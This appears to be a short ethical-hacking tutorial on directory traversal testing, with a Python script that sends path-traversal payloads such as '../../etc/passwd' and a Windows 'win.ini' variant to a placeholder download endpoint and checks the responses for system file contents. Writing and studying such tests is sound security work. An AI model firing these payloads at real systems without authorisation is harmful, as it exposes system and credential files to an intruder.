Directory Traversal Testing

What is Directory Traversal Testing?

Directory Traversal Testing is the process of checking whether a web application is vulnerable to path manipulation, allowing attackers to access restricted directories and files by using special character sequences like ../.


Why is it Important in Ethical Hacking and Penetration Testing?

This vulnerability can expose sensitive files that should not be accessible through the web interface. It can lead to:

  • Exposure of configuration or system files
  • Access to hidden credentials
  • Unauthorized data leakage
  • Complete server compromise if chained with other exploits

Detecting and patching this issue is essential to secure file access control.

Python Code: Directory Traversal Testing


import requests

# Target vulnerable endpoint (change to your test target)
target_url = "http://example.com/download?file="

# Common directory traversal payloads
payloads = [
"../../etc/passwd",
"../../../etc/passwd",
"../../../../etc/passwd",
"..%2F..%2F..%2Fetc%2Fpasswd", # URL-encoded
"..\\..\\..\\windows\\win.ini" # For Windows targets
]

print("[+] Testing for directory traversal vulnerabilities...\n")

for payload in payloads:
url = target_url + payload
try:
response = requests.get(url, timeout=5)
if "root:" in response.text or "[extensions]" in response.text:
print(f"[!] Potential Directory Traversal found with payload: {payload}")
print(f" URL: {url}")
break
else:
print(f"[-] Tried {payload} — No sensitive data exposed.")
except requests.exceptions.RequestException:
print(f"[!] Error connecting to {url}")
